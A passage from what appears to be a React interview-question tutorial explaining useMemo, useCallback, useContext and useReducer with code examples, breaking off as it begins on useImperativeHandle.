- Compares dependencies on every render

Only use when benefit > cost:

Bad (cost > benefit):
const sum = useMemo(() => a + b, [a, b]); // Comparison cost > addition cost

Good (benefit > cost):
const filtered = useMemo(() => 
  hugeArray.filter(item => expensiveCheck(item)), 
  [hugeArray]
); // Saves expensive re-filtering

Debugging:
----------

Check if memoization is working:

const value = useMemo(() => {
  console.log('Computing expensive value');
  return expensiveComputation();
}, [deps]);

If you see "Computing expensive value" on every render, deps are changing too often.

Common mistakes:
----------------

1. Missing dependencies:

const result = useMemo(() => {
  return data.filter(item => item.type === filterType);
}, [data]); // ❌ Missing filterType!

Fix:
}, [data, filterType]); // ✅

2. Inline object dependencies:

const value = useMemo(() => {
  return computeFromOptions(options);
}, [{ option1, option2 }]); // ❌ New object every render!

Fix:
}, [option1, option2]); // ✅ Depend on primitives

3. Over-memoizing:

function Component() {
  const a = useMemo(() => 1 + 1, []); // ❌ Overkill
  const b = useMemo(() => 'hello', []); // ❌ Overkill
  const c = useMemo(() => true, []); // ❌ Overkill
}

Summary:

useMemo:
- Caches expensive computation results
- Maintains referential equality for objects/arrays
- Prevents unnecessary re-renders of child components
- Has overhead, use judiciously
- Dependencies must include all used values
- Primary use: performance optimization, not correctness
*/


/**
28. What is useCallback and how does it help performance?
---------------------------------------------------------

useCallback is a hook that memoizes a function, returning the same function reference 
across renders unless dependencies change.

Syntax:

const memoizedCallback = useCallback(
  () => {
    // function body
  },
  [dependencies]
);

Equivalent to:
const memoizedCallback = useMemo(() => functionDefinition, [dependencies]);

Problem useCallback solves:
----------------------------

Functions are recreated on every render:

function Parent() {
  const [count, setCount] = useState(0);
  
  // New function created every render
  const handleClick = () => {
    console.log('Clicked');
  };
  
  return <Child onClick={handleClick} />;
}

Every render creates new handleClick → new reference → Child sees "different" prop → 
Child re-renders even if memoized with React.memo.

Problem 1: Preventing unnecessary child re-renders
---------------------------------------------------

WITHOUT useCallback:

function Parent() {
  const [count, setCount] = useState(0);
  const [text, setText] = useState('');
  
  const handleClick = () => {
    console.log('Clicked');
  };
  
  return (
    <div>
      <input value={text} onChange={e => setText(e.target.value)} />
      <button onClick={() => setCount(c => c + 1)}>Count: {count}</button>
      <ExpensiveChild onClick={handleClick} />
    </div>
  );
}

const ExpensiveChild = React.memo(({ onClick }) => {
  console.log('ExpensiveChild rendered');
  return <button onClick={onClick}>Child Button</button>;
});

Problem: Typing in input creates new handleClick → ExpensiveChild re-renders unnecessarily.

WITH useCallback:

function Parent() {
  const [count, setCount] = useState(0);
  const [text, setText] = useState('');
  
  // Same function reference across renders
  const handleClick = useCallback(() => {
    console.log('Clicked');
  }, []); // No dependencies = never changes
  
  return (
    <div>
      <input value={text} onChange={e => setText(e.target.value)} />
      <button onClick={() => setCount(c => c + 1)}>Count: {count}</button>
      <ExpensiveChild onClick={handleClick} />
    </div>
  );
}

const ExpensiveChild = React.memo(({ onClick }) => {
  console.log('ExpensiveChild rendered'); // Only once!
  return <button onClick={onClick}>Child Button</button>;
});

Result: ExpensiveChild doesn't re-render when text changes (handleClick reference is stable).

Problem 2: Stable dependencies in useEffect
--------------------------------------------

WITHOUT useCallback:

function ChatRoom({ roomId }) {
  const [messages, setMessages] = useState([]);
  
  const fetchMessages = () => {
    fetch(`/api/messages/${roomId}`)
      .then(res => res.json())
      .then(setMessages);
  };
  
  useEffect(() => {
    fetchMessages();
    // ⚠️ Warning: fetchMessages recreated every render
  }, [fetchMessages]); // Dependency changes every render!
  
  return <div>...</div>;
}

Problem: fetchMessages is a new function every render → useEffect runs every render!

WITH useCallback:

function ChatRoom({ roomId }) {
  const [messages, setMessages] = useState([]);
  
  const fetchMessages = useCallback(() => {
    fetch(`/api/messages/${roomId}`)
      .then(res => res.json())
      .then(setMessages);
  }, [roomId]); // Only recreate when roomId changes
  
  useEffect(() => {
    fetchMessages();
  }, [fetchMessages]); // Stable dependency
  
  return <div>...</div>;
}

Now useEffect only runs when roomId actually changes.

Real-world examples:
--------------------

Example 1: Event handlers passed to children

function TodoList() {
  const [todos, setTodos] = useState([]);
  
  const handleToggle = useCallback((id) => {
    setTodos(prev => prev.map(todo =>
      todo.id === id ? { ...todo, done: !todo.done } : todo
    ));
  }, []); // No external dependencies
  
  const handleDelete = useCallback((id) => {
    setTodos(prev => prev.filter(todo => todo.id !== id));
  }, []);
  
  return (
    <div>
      {todos.map(todo => (
        <TodoItem
          key={todo.id}
          todo={todo}
          onToggle={handleToggle}
          onDelete={handleDelete}
        />
      ))}
    </div>
  );
}

const TodoItem = React.memo(({ todo, onToggle, onDelete }) => {
  console.log('TodoItem rendered:', todo.id);
  
  return (
    <div>
      <input
        type="checkbox"
        checked={todo.done}
        onChange={() => onToggle(todo.id)}
      />
      {todo.text}
      <button onClick={() => onDelete(todo.id)}>Delete</button>
    </div>
  );
});

Without useCallback, all TodoItems would re-render when any todo changes.

Example 2: Debounced search

function SearchBox() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);
  
  const performSearch = useCallback(async (searchQuery) => {
    const res = await fetch(`/api/search?q=${searchQuery}`);
    const data = await res.json();
    setResults(data);
  }, []);
  
  // Debounce function
  const debouncedSearch = useCallback(
    debounce((q) => performSearch(q), 500),
    [performSearch]
  );
  
  const handleChange = (e) => {
    setQuery(e.target.value);
    debouncedSearch(e.target.value);
  };
  
  return (
    <div>
      <input value={query} onChange={handleChange} />
      {results.map(r => <div key={r.id}>{r.title}</div>)}
    </div>
  );
}

Example 3: Custom hooks with callbacks

function useKeyPress(targetKey, callback) {
  // Memoize callback to avoid re-attaching event listener
  const memoizedCallback = useCallback(callback, [callback]);
  
  useEffect(() => {
    const handler = (e) => {
      if (e.key === targetKey) {
        memoizedCallback(e);
      }
    };
    
    window.addEventListener('keydown', handler);
    return () => window.removeEventListener('keydown', handler);
  }, [targetKey, memoizedCallback]);
}

// Usage
function Component() {
  const handleEscape = useCallback(() => {
    console.log('Escape pressed');
  }, []);
  
  useKeyPress('Escape', handleEscape);
}

Example 4: Callbacks with dependencies

function ProductFilter({ minPrice, maxPrice }) {
  const [products, setProducts] = useState([]);
  
  // Recreates when min/max price changes
  const filterProducts = useCallback((products) => {
    return products.filter(p => 
      p.price >= minPrice && p.price <= maxPrice
    );
  }, [minPrice, maxPrice]);
  
  useEffect(() => {
    fetch('/api/products')
      .then(res => res.json())
      .then(data => setProducts(filterProducts(data)));
  }, [filterProducts]);
  
  return <div>...</div>;
}

Example 5: Inline handlers vs useCallback

When to use inline:

function Parent() {
  const [count, setCount] = useState(0);
  
  // Inline is fine if child isn't memoized
  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>
        Count: {count}
      </button>
      <UnmemoizedChild onClick={() => console.log('clicked')} />
    </div>
  );
}

When to useCallback:

function Parent() {
  const [count, setCount] = useState(0);
  
  // useCallback needed if child is memoized
  const handleClick = useCallback(() => {
    console.log('clicked');
  }, []);
  
  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>Count: {count}</button>
      <MemoizedChild onClick={handleClick} />
    </div>
  );
}

const MemoizedChild = React.memo(({ onClick }) => {
  return <button onClick={onClick}>Click</button>;
});

When NOT to use useCallback:
-----------------------------

1. Functions not passed to children:

// Don't useCallback for internal handlers not passed down
function Component() {
  const handleClick = useCallback(() => {
    console.log('Local handler');
  }, []); // Unnecessary!
  
  return <button onClick={handleClick}>Click</button>;
}

Better:

function Component() {
  const handleClick = () => {
    console.log('Local handler');
  };
  
  return <button onClick={handleClick}>Click</button>;
}

2. Children not memoized:

// Don't useCallback if child doesn't use React.memo
const handleClick = useCallback(() => {}, []); // Wasted effort

<UnmemoizedChild onClick={handleClick} />

3. Premature optimization:

// Don't useCallback everything
const add = useCallback((a, b) => a + b, []); // Pointless!
const value = add(1, 2);

When TO use useCallback:
-------------------------

✅ Function passed to memoized child (React.memo)
✅ Function used as dependency in useEffect/useMemo/useCallback
✅ Function passed to custom hooks
✅ Function attached to expensive event listeners
✅ Function identity matters for equality checks

Performance trade-offs:
------------------------

useCallback has cost:
- Creates closure
- Stores function in memory
- Compares dependencies on every render

Only beneficial when:
- Child component is expensive to render
- Function is used in hooks' dependency arrays
- Function identity matters for other optimizations

Bad (no benefit):

function Component() {
  const handleClick = useCallback(() => {
    console.log('click');
  }, []); // Cost of useCallback > benefit
  
  return <button onClick={handleClick}>Click</button>;
}

Good (clear benefit):

function Component() {
  const handleClick = useCallback(() => {
    console.log('click');
  }, []);
  
  return <ExpensiveChild onClick={handleClick} />;
  // Prevents expensive child re-render
}

Common patterns:
----------------

Pattern 1: Handler factories

function ItemList({ items }) {
  const handleItemClick = useCallback((id) => {
    console.log('Item clicked:', id);
  }, []);
  
  return (
    <div>
      {items.map(item => (
        <Item key={item.id} item={item} onClick={() => handleItemClick(item.id)} />
      ))}
    </div>
  );
}

Pattern 2: Callback with state updates

function Counter() {
  const [count, setCount] = useState(0);
  
  // No dependency on count (uses functional update)
  const increment = useCallback(() => {
    setCount(c => c + 1);
  }, []);
  
  const incrementBy = useCallback((amount) => {
    setCount(c => c + amount);
  }, []);
  
  return (
    <div>
      <button onClick={increment}>+1</button>
      <button onClick={() => incrementBy(5)}>+5</button>
    </div>
  );
}

Pattern 3: Combining with useMemo

function DataProcessor({ data }) {
  const processedData = useMemo(() => {
    return expensiveProcess(data);
  }, [data]);
  
  const handleExport = useCallback(() => {
    exportToCSV(processedData);
  }, [processedData]); // Depends on memoized value
  
  return <button onClick={handleExport}>Export</button>;
}

Debugging:
----------

Check if callback is stable:

const handleClick = useCallback(() => {
  console.log('Click handler created');
}, [deps]);

If you see "Click handler created" on every render, dependencies are changing too often.

Common mistakes:
----------------

1. Missing dependencies:

const handleSubmit = useCallback(() => {
  sendData(formData);
}, []); // ❌ Missing formData dependency!

Fix:
}, [formData]); // ✅

2. Inline object/array dependencies:

const callback = useCallback(() => {
  doSomething(config);
}, [{ option1, option2 }]); // ❌ New object every render!

Fix:
}, [option1, option2]); // ✅ Primitive dependencies

3. Overusing useCallback:

function Component() {
  const a = useCallback(() => {}, []);
  const b = useCallback(() => {}, []);
  const c = useCallback(() => {}, []);
  // Too much! Evaluate if needed
}

Summary:

useCallback:
- Memoizes functions to maintain stable references
- Prevents unnecessary child re-renders (with React.memo)
- Stabilizes dependencies in useEffect/useMemo
- Has overhead, use when benefits are clear
- Primary use: child component optimization, not correctness
- Alternative to useMemo(() => fn, deps)
*/


/**
29. What is useContext and how does the Context API work?
---------------------------------------------------------

useContext is a hook that lets you consume context values without using Context.Consumer.
Context API provides a way to pass data through the component tree without manually passing 
props at every level ("prop drilling").

Problem Context solves: Prop drilling
--------------------------------------

WITHOUT Context (prop drilling):

function App() {
  const [user, setUser] = useState({ name: 'Alice', theme: 'dark' });
  
  return <Layout user={user} />;
}

function Layout({ user }) {
  return <Sidebar user={user} />;
}

function Sidebar({ user }) {
  return <Navigation user={user} />;
}

function Navigation({ user }) {
  return <UserProfile user={user} />;
}

function UserProfile({ user }) {
  return <div>{user.name}</div>;
}

Problem: user is passed through Layout, Sidebar, Navigation just to reach UserProfile.

WITH Context:

// 1. Create context
const UserContext = React.createContext();

// 2. Provide value at top level
function App() {
  const [user, setUser] = useState({ name: 'Alice', theme: 'dark' });
  
  return (
    <UserContext.Provider value={user}>
      <Layout />
    </UserContext.Provider>
  );
}

// 3. Components in between don't need to know about user
function Layout() {
  return <Sidebar />;
}

function Sidebar() {
  return <Navigation />;
}

function Navigation() {
  return <UserProfile />;
}

// 4. Consume context where needed
function UserProfile() {
  const user = useContext(UserContext);
  return <div>{user.name}</div>;
}

No more prop drilling!

Basic Context API usage:
------------------------

Step 1: Create context

import { createContext } from 'react';

// Optional default value
const ThemeContext = createContext('light');

Step 2: Provide context value

function App() {
  const [theme, setTheme] = useState('dark');
  
  return (
    <ThemeContext.Provider value={theme}>
      <Page />
    </ThemeContext.Provider>
  );
}

Step 3: Consume context with useContext

function ThemedButton() {
  const theme = useContext(ThemeContext);
  
  return (
    <button className={theme === 'dark' ? 'btn-dark' : 'btn-light'}>
      Click me
    </button>
  );
}

How Context works internally:
------------------------------

1. Provider broadcasts value
2. Any component below Provider can subscribe to context
3. When context value changes, all subscribers re-render
4. Components between Provider and consumer don't need to pass props

Real-world examples:
--------------------

Example 1: Theme context

// contexts/ThemeContext.js
import { createContext, useContext, useState } from 'react';

const ThemeContext = createContext();

export function ThemeProvider({ children }) {
  const [theme, setTheme] = useState('light');
  
  const toggleTheme = () => {
    setTheme(prev => prev === 'light' ? 'dark' : 'light');
  };
  
  const value = {
    theme,
    toggleTheme
  };
  
  return (
    <ThemeContext.Provider value={value}>
      {children}
    </ThemeContext.Provider>
  );
}

export function useTheme() {
  const context = useContext(ThemeContext);
  if (!context) {
    throw new Error('useTheme must be used within ThemeProvider');
  }
  return context;
}

// App.js
function App() {
  return (
    <ThemeProvider>
      <Header />
      <Content />
      <Footer />
    </ThemeProvider>
  );
}

// Any component can use theme
function Header() {
  const { theme, toggleTheme } = useTheme();
  
  return (
    <header className={theme}>
      <button onClick={toggleTheme}>
        Switch to {theme === 'light' ? 'dark' : 'light'}
      </button>
    </header>
  );
}

Example 2: Authentication context

const AuthContext = createContext();

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    // Check if user is logged in
    fetchCurrentUser()
      .then(setUser)
      .finally(() => setLoading(false));
  }, []);
  
  const login = async (email, password) => {
    const user = await loginAPI(email, password);
    setUser(user);
  };
  
  const logout = () => {
    logoutAPI();
    setUser(null);
  };
  
  const value = {
    user,
    loading,
    login,
    logout,
    isAuthenticated: !!user
  };
  
  return (
    <AuthContext.Provider value={value}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within AuthProvider');
  }
  return context;
}

// Usage
function Profile() {
  const { user, logout } = useAuth();
  
  if (!user) return <div>Please log in</div>;
  
  return (
    <div>
      <h1>{user.name}</h1>
      <button onClick={logout}>Logout</button>
    </div>
  );
}

function ProtectedRoute({ children }) {
  const { isAuthenticated, loading } = useAuth();
  
  if (loading) return <div>Loading...</div>;
  if (!isAuthenticated) return <Navigate to="/login" />;
  
  return children;
}

Example 3: Multi-level nested context

function App() {
  return (
    <AuthProvider>
      <ThemeProvider>
        <LanguageProvider>
          <Router>
            <Routes />
          </Router>
        </LanguageProvider>
      </ThemeProvider>
    </AuthProvider>
  );
}

function Component() {
  const { user } = useAuth();
  const { theme } = useTheme();
  const { t } = useLanguage();
  
  return (
    <div className={theme}>
      {t('welcome', { name: user.name })}
    </div>
  );
}

Example 4: Form context

const FormContext = createContext();

export function Form({ initialValues, onSubmit, children }) {
  const [values, setValues] = useState(initialValues);
  const [errors, setErrors] = useState({});
  
  const setValue = (name, value) => {
    setValues(prev => ({ ...prev, [name]: value }));
  };
  
  const handleSubmit = (e) => {
    e.preventDefault();
    const validationErrors = validate(values);
    
    if (Object.keys(validationErrors).length === 0) {
      onSubmit(values);
    } else {
      setErrors(validationErrors);
    }
  };
  
  const value = {
    values,
    errors,
    setValue
  };
  
  return (
    <FormContext.Provider value={value}>
      <form onSubmit={handleSubmit}>
        {children}
      </form>
    </FormContext.Provider>
  );
}

export function FormField({ name, label }) {
  const { values, errors, setValue } = useContext(FormContext);
  
  return (
    <div>
      <label>{label}</label>
      <input
        value={values[name] || ''}
        onChange={e => setValue(name, e.target.value)}
      />
      {errors[name] && <span className="error">{errors[name]}</span>}
    </div>
  );
}

// Usage
function MyForm() {
  return (
    <Form
      initialValues={{ email: '', password: '' }}
      onSubmit={values => console.log(values)}
    >
      <FormField name="email" label="Email" />
      <FormField name="password" label="Password" />
      <button type="submit">Submit</button>
    </Form>
  );
}

Context performance optimization:
---------------------------------

Problem: All consumers re-render when context value changes

function App() {
  const [user, setUser] = useState({ name: 'Alice' });
  const [theme, setTheme] = useState('dark');
  
  // New object on every render!
  const value = { user, theme, setUser, setTheme };
  
  return (
    <AppContext.Provider value={value}>
      <Component />
    </AppContext.Provider>
  );
}

Every render creates new value object → all consumers re-render even if data unchanged.

Solution 1: useMemo for context value

function App() {
  const [user, setUser] = useState({ name: 'Alice' });
  const [theme, setTheme] = useState('dark');
  
  // Memoize context value
  const value = useMemo(() => ({
    user,
    theme,
    setUser,
    setTheme
  }), [user, theme]);
  
  return (
    <AppContext.Provider value={value}>
      <Component />
    </AppContext.Provider>
  );
}

Now value only changes when user or theme actually changes.

Solution 2: Split contexts

// Instead of one context with everything
const UserContext = createContext();
const ThemeContext = createContext();

function App() {
  const [user, setUser] = useState({ name: 'Alice' });
  const [theme, setTheme] = useState('dark');
  
  return (
    <UserContext.Provider value={{ user, setUser }}>
      <ThemeContext.Provider value={{ theme, setTheme }}>
        <Component />
      </ThemeContext.Provider>
    </UserContext.Provider>
  );
}

// Components only re-render when their specific context changes
function UserProfile() {
  const { user } = useContext(UserContext);
  // Only re-renders when user changes, not theme
  return <div>{user.name}</div>;
}

function ThemedButton() {
  const { theme } = useContext(ThemeContext);
  // Only re-renders when theme changes, not user
  return <button className={theme}>Click</button>;
}

Solution 3: Context selectors (with external libraries)

// Using libraries like use-context-selector
import { createContext, useContextSelector } from 'use-context-selector';

const AppContext = createContext();

function UserName() {
  // Only re-renders when user.name changes
  const userName = useContextSelector(AppContext, state => state.user.name);
  return <div>{userName}</div>;
}

Default values in createContext:
---------------------------------

const ThemeContext = createContext('light'); // Default value

Default value is used ONLY when:
- Component uses context but there's no Provider above it in tree

function Component() {
  const theme = useContext(ThemeContext);
  // If no Provider, theme === 'light' (default)
  return <div className={theme}>Content</div>;
}

Default value is NOT used when:
- Provider exists with value={undefined}

<ThemeContext.Provider value={undefined}>
  <Component /> {/ * theme is undefined, not 'light' * /}
</ThemeContext.Provider>

Common patterns:
----------------

Pattern 1: Custom hook for context

export function useMyContext() {
  const context = useContext(MyContext);
  if (context === undefined) {
    throw new Error('useMyContext must be used within MyContextProvider');
  }
  return context;
}

Pattern 2: Context with reducer

const StateContext = createContext();
const DispatchContext = createContext();

function AppProvider({ children }) {
  const [state, dispatch] = useReducer(reducer, initialState);
  
  return (
    <StateContext.Provider value={state}>
      <DispatchContext.Provider value={dispatch}>
        {children}
      </DispatchContext.Provider>
    </StateContext.Provider>
  );
}

export function useState() {
  return useContext(StateContext);
}

export function useDispatch() {
  return useContext(DispatchContext);
}

Pattern 3: Composed providers

function AppProviders({ children }) {
  return (
    <AuthProvider>
      <ThemeProvider>
        <I18nProvider>
          {children}
        </I18nProvider>
      </ThemeProvider>
    </AuthProvider>
  );
}

When NOT to use Context:
-------------------------

❌ For frequently changing values (causes many re-renders)
❌ For performance-critical state (consider useState, Redux, Zustand)
❌ For simple parent-child communication (just use props)
❌ For everything (overusing context makes code harder to understand)

When TO use Context:
--------------------

✅ Theme, locale, authentication (changes infrequently)
✅ Avoiding deep prop drilling (5+ levels)
✅ Sharing state across unrelated components
✅ Providing dependencies/services to subtree

Summary:

useContext:
- Consumes context created with createContext
- Avoids prop drilling
- All consumers re-render when context value changes
- Optimize with useMemo and split contexts
- Best for infrequently changing data
- Combine with custom hooks for better API
*/


/**
30. What is useReducer and when should you use it over useState?
----------------------------------------------------------------

useReducer is a hook for managing complex state with a reducer function, similar to Redux.

Syntax:

const [state, dispatch] = useReducer(reducer, initialState);

// Or with lazy initialization:
const [state, dispatch] = useReducer(reducer, initialArg, init);

- reducer: (state, action) => newState function
- initialState: starting state value
- init: optional function to lazily create initial state
- state: current state value
- dispatch: function to send actions to reducer

Basic example:
--------------

function reducer(state, action) {
  switch (action.type) {
    case 'increment':
      return { count: state.count + 1 };
    case 'decrement':
      return { count: state.count - 1 };
    case 'reset':
      return { count: 0 };
    default:
      throw new Error(`Unknown action: ${action.type}`);
  }
}

function Counter() {
  const [state, dispatch] = useReducer(reducer, { count: 0 });
  
  return (
    <div>
      Count: {state.count}
      <button onClick={() => dispatch({ type: 'increment' })}>+</button>
      <button onClick={() => dispatch({ type: 'decrement' })}>-</button>
      <button onClick={() => dispatch({ type: 'reset' })}>Reset</button>
    </div>
  );
}

Equivalent with useState:

function Counter() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      Count: {count}
      <button onClick={() => setCount(c => c + 1)}>+</button>
      <button onClick={() => setCount(c => c - 1)}>-</button>
      <button onClick={() => setCount(0)}>Reset</button>
    </div>
  );
}

When to use useReducer over useState:
--------------------------------------

1. Multiple related state values
---------------------------------

BAD with useState (too many related states):

function Form() {
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  
  // Many separate setters, hard to coordinate
  const handleSubmit = async () => {
    setLoading(true);
    setErrors({});
    try {
      await submitForm({ name, email, password });
      setSubmitted(true);
      setLoading(false);
    } catch (err) {
      setErrors(err.errors);
      setLoading(false);
    }
  };
}

GOOD with useReducer (grouped state logic):

function formReducer(state, action) {
  switch (action.type) {
    case 'SET_FIELD':
      return {
        ...state,
        [action.field]: action.value,
        errors: { ...state.errors, [action.field]: null }
      };
    case 'SET_ERRORS':
      return { ...state, errors: action.errors };
    case 'SUBMIT_START':
      return { ...state, loading: true, errors: {} };
    case 'SUBMIT_SUCCESS':
      return { ...state, loading: false, submitted: true };
    case 'SUBMIT_ERROR':
      return { ...state, loading: false, errors: action.errors };
    case 'RESET':
      return initialState;
    default:
      return state;
  }
}

const initialState = {
  name: '',
  email: '',
  password: '',
  errors: {},
  loading: false,
  submitted: false
};

function Form() {
  const [state, dispatch] = useReducer(formReducer, initialState);
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    dispatch({ type: 'SUBMIT_START' });
    
    try {
      await submitForm(state);
      dispatch({ type: 'SUBMIT_SUCCESS' });
    } catch (err) {
      dispatch({ type: 'SUBMIT_ERROR', errors: err.errors });
    }
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input
        value={state.name}
        onChange={e => dispatch({ 
          type: 'SET_FIELD', 
          field: 'name', 
          value: e.target.value 
        })}
      />
      {state.errors.name && <span>{state.errors.name}</span>}
      
      <input
        value={state.email}
        onChange={e => dispatch({ 
          type: 'SET_FIELD', 
          field: 'email', 
          value: e.target.value 
        })}
      />
      {state.errors.email && <span>{state.errors.email}</span>}
      
      <button disabled={state.loading}>
        {state.loading ? 'Submitting...' : 'Submit'}
      </button>
      
      {state.submitted && <p>Success!</p>}
    </form>
  );
}

2. Complex state transitions
-----------------------------

Shopping cart with complex logic:

function cartReducer(state, action) {
  switch (action.type) {
    case 'ADD_ITEM': {
      const existingIndex = state.items.findIndex(
        item => item.id === action.item.id
      );
      
      if (existingIndex >= 0) {
        // Item exists, increase quantity
        const newItems = [...state.items];
        newItems[existingIndex] = {
          ...newItems[existingIndex],
          quantity: newItems[existingIndex].quantity + 1
        };
        return { ...state, items: newItems };
      } else {
        // New item
        return {
          ...state,
          items: [...state.items, { ...action.item, quantity: 1 }]
        };
      }
    }
    
    case 'REMOVE_ITEM':
      return {
        ...state,
        items: state.items.filter(item => item.id !== action.id)
      };
    
    case 'UPDATE_QUANTITY':
      return {
        ...state,
        items: state.items.map(item =>
          item.id === action.id
            ? { ...item, quantity: action.quantity }
            : item
        )
      };
    
    case 'APPLY_DISCOUNT':
      return {
        ...state,
        discount: action.discount,
        discountCode: action.code
      };
    
    case 'CLEAR_CART':
      return { items: [], discount: 0, discountCode: null };
    
    default:
      return state;
  }
}

function ShoppingCart() {
  const [state, dispatch] = useReducer(cartReducer, {
    items: [],
    discount: 0,
    discountCode: null
  });
  
  const total = state.items.reduce(
    (sum, item) => sum + item.price * item.quantity,
    0
  );
  const finalTotal = total * (1 - state.discount);
  
  return (
    <div>
      {state.items.map(item => (
        <div key={item.id}>
          {item.name} x {item.quantity}
          <button onClick={() => 
            dispatch({ type: 'REMOVE_ITEM', id: item.id })
          }>
            Remove
          </button>
        </div>
      ))}
      <p>Total: ${finalTotal}</p>
    </div>
  );
}

3. Next state depends on previous state
----------------------------------------

With useState, you need functional updates:

const [state, setState] = useState({ count: 0, history: [] });

const increment = () => {
  setState(prev => ({
    count: prev.count + 1,
    history: [...prev.history, prev.count + 1]
  }));
};

With useReducer, logic is centralized:

function reducer(state, action) {
  switch (action.type) {
    case 'increment':
      return {
        count: state.count + 1,
        history: [...state.history, state.count + 1]
      };
    case 'decrement':
      return {
        count: state.count - 1,
        history: [...state.history, state.count - 1]
      };
    default:
      return state;
  }
}

const [state, dispatch] = useReducer(reducer, { count: 0, history: [] });

4. Easier testing
-----------------

Reducer is a pure function, easy to test:

// reducer.test.js
import { reducer } from './reducer';

test('increment increases count', () => {
  const state = { count: 0 };
  const action = { type: 'increment' };
  
  expect(reducer(state, action)).toEqual({ count: 1 });
});

test('decrement decreases count', () => {
  const state = { count: 5 };
  const action = { type: 'decrement' };
  
  expect(reducer(state, action)).toEqual({ count: 4 });
});

5. Sharing logic across components
-----------------------------------

Same reducer can be used in multiple components:

// reducers/todoReducer.js
export function todoReducer(state, action) {
  switch (action.type) {
    case 'ADD_TODO':
      return [...state, { id: Date.now(), text: action.text, done: false }];
    case 'TOGGLE_TODO':
      return state.map(todo =>
        todo.id === action.id ? { ...todo, done: !todo.done } : todo
      );
    case 'DELETE_TODO':
      return state.filter(todo => todo.id !== action.id);
    default:
      return state;
  }
}

// Component A
function TodoListA() {
  const [todos, dispatch] = useReducer(todoReducer, []);
  // ...
}

// Component B (reuses same reducer)
function TodoListB() {
  const [todos, dispatch] = useReducer(todoReducer, []);
  // ...
}

6. Combining with Context (Redux pattern)
------------------------------------------

const TodoContext = createContext();

function TodoProvider({ children }) {
  const [todos, dispatch] = useReducer(todoReducer, []);
  
  return (
    <TodoContext.Provider value={{ todos, dispatch }}>
      {children}
    </TodoContext.Provider>
  );
}

function useTodos() {
  return useContext(TodoContext);
}

// Any component can access
function TodoList() {
  const { todos, dispatch } = useTodos();
  
  return (
    <div>
      {todos.map(todo => (
        <div key={todo.id}>
          {todo.text}
          <button onClick={() => dispatch({ type: 'TOGGLE_TODO', id: todo.id })}>
            Toggle
          </button>
        </div>
      ))}
    </div>
  );
}

Lazy initialization:
--------------------

Expensive initial state calculation:

function init(initialCount) {
  // Expensive computation
  return { count: initialCount, history: [] };
}

function Counter({ initialCount }) {
  // init only runs once
  const [state, dispatch] = useReducer(reducer, initialCount, init);
  
  return <div>Count: {state.count}</div>;
}

Real-world example: Data fetching
----------------------------------

function dataReducer(state, action) {
  switch (action.type) {
    case 'FETCH_START':
      return { ...state, loading: true, error: null };
    case 'FETCH_SUCCESS':
      return {
        loading: false,
        error: null,
        data: action.data
      };
    case 'FETCH_ERROR':
      return {
        loading: false,
        error: action.error,
        data: null
      };
    default:
      return state;
  }
}

function UserProfile({ userId }) {
  const [state, dispatch] = useReducer(dataReducer, {
    loading: false,
    error: null,
    data: null
  });
  
  useEffect(() => {
    dispatch({ type: 'FETCH_START' });
    
    fetch(`/api/users/${userId}`)
      .then(res => res.json())
      .then(data => dispatch({ type: 'FETCH_SUCCESS', data }))
      .catch(error => dispatch({ type: 'FETCH_ERROR', error }));
  }, [userId]);
  
  if (state.loading) return <div>Loading...</div>;
  if (state.error) return <div>Error: {state.error.message}</div>;
  if (!state.data) return null;
  
  return <div>{state.data.name}</div>;
}

useState vs useReducer decision tree:
--------------------------------------

Use useState when:
✅ Simple independent state (single value)
✅ Boolean toggles
✅ Simple counters
✅ Form inputs (single field)
✅ State updates are straightforward

Use useReducer when:
✅ Multiple related state values
✅ Complex state transitions
✅ Next state depends on previous state
✅ Need to track state history
✅ State logic is complex enough to benefit from separation
✅ Easier to test state logic in isolation
✅ Want to share state logic across components
✅ Building state management similar to Redux

Comparison table:
-----------------

Aspect              | useState                    | useReducer
--------------------|----------------------------|---------------------------
State structure     | Simple, single values      | Complex, multiple values
Logic location      | In components              | Centralized in reducer
Testability         | Test components            | Test pure reducer function
Readability         | Simple cases               | Complex state transitions
Boilerplate         | Less                       | More (action types, reducer)
Redux-like          | No                         | Yes
Learning curve      | Easier                     | Steeper

Common patterns with useReducer:
---------------------------------

Pattern 1: Action creators

// Instead of inline dispatch
dispatch({ type: 'ADD_TODO', text: 'Buy milk' });

// Use action creators
function addTodo(text) {
  return { type: 'ADD_TODO', text };
}

dispatch(addTodo('Buy milk'));

Pattern 2: Middleware-like logic

function reducerWithLogger(reducer) {
  return (state, action) => {
    console.log('Previous state:', state);
    console.log('Action:', action);
    const newState = reducer(state, action);
    console.log('New state:', newState);
    return newState;
  };
}

const [state, dispatch] = useReducer(
  reducerWithLogger(todoReducer),
  initialState
);

Pattern 3: Immer for immutable updates

import { useImmerReducer } from 'use-immer';

function reducer(draft, action) {
  switch (action.type) {
    case 'ADD_TODO':
      // Mutate draft directly (Immer handles immutability)
      draft.push({ id: Date.now(), text: action.text });
      break;
    case 'TOGGLE_TODO':
      const todo = draft.find(t => t.id === action.id);
      if (todo) todo.done = !todo.done;
      break;
  }
}

const [todos, dispatch] = useImmerReducer(reducer, []);

Summary:

useReducer is ideal when:
- State has multiple sub-values
- Complex state transitions
- Next state depends on previous
- Need testable state logic
- Building Redux-like architecture
- Want to separate state logic from component

useState is simpler for:
- Single values
- Independent state pieces
- Simple updates
- Getting started quickly
*/


/**
31. What is useImperativeHandle?
--------------------------------

useImperativeHandle customizes the instance value exposed when using ref with 
forwardRef. It allows parent components to call specific methods on child components 
while keeping most of the component's internals private.

Syntax:

useImperativeHandle(ref, createHandle, [dependencies]);

- ref: the ref forwarded from parent
- createHandle: function that returns the object exposed to parent
- dependencies: optional array (like useEffect)

Why it exists:
--------------

React encourages declarative programming (passing props), but sometimes you need 
imperative actions (calling methods on child components). useImperativeHandle lets 
